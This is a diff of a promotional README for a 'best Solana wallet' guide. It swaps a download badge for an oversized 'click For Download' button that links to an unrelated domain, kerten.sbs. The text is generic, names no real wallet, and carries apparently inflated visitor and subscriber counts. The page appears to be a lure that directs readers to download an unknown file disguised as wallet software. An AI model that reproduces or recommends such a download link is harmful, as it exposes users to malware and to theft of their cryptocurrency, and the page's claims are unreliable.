@@ -2,11 +2,15 @@
 
 Choosing the best Solana wallet is essential for safely storing and managing your Solana assets. Whether you're looking for a wallet with advanced features or a simple and secure solution, the best wallets on the market offer seamless integration with the Solana blockchain. These wallets provide high levels of security, fast transaction times, and intuitive user interfaces for both beginners and experienced users. From hardware wallets to software solutions, here’s your guide to the most trusted and efficient wallets available for Solana.
 
-<div style="text-align: center">
-  <a href="https://best-solana-wallet.github.io/.github/">
-    <img class="bumbum" style="width: 400px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Best_Solana_Wallet-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
